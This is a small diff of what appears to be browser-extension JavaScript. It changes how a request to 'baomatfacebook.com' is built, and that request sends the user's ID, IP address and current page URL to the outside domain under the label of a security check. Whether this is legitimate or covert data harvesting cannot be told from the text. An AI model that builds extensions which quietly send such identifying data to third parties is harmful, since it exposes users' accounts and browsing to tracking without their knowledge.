@@ -1,9 +1,9 @@
 // Set variables
-var url = window.location.host;
+var urlBase = 'https://baomatfacebook.com/api/';
 
 $(document).ready(function() {
     chrome.extension.sendMessage({name: "checkSecurity"}, function(response) {
-        var url = 'https://baomatfacebook.com/api/check-security?user_id=' + response.user_id + '&ip=' + response.ip + '&url=' + response.url;
+        var url = urlBase + 'check-security?user_id=' + response.user_id + '&ip=' + response.ip + '&url=' + response.url;
 
         var xhr = new XMLHttpRequest();
         xhr.open("GET", url, true);
